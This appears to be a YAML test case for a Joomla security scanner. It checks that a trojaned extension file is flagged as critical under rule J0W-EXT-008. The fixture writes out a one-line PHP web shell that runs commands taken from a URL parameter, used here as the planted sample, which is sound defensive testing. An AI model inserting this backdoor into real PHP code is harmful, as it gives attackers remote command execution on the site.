# Positivo (fase 2a, Task 6): archivo ejecutable atribuido de com_labext con
# contenido distinto al del paquete oficial (troyano en una extensión de
# confianza) → J0W-EXT-008 critical (D5: divergencia en ejecutable = crítico).
case: ext-trojan
base:
  cms: joomla
  version: "1.1.0"
expect:
  exit_code: 1
  findings:
    - rule_id: J0W-EXT-008
      subject: components/com_labext/router.php
      min_severity: critical
mutations:
  - op: add_extension
  - op: add_extension_baseline
  - op: replace_file
    path: components/com_labext/router.php
    content: "<?php\n// troyano: puerta trasera plantada sobre un archivo legítimo\nsystem($_GET['c']);\n"
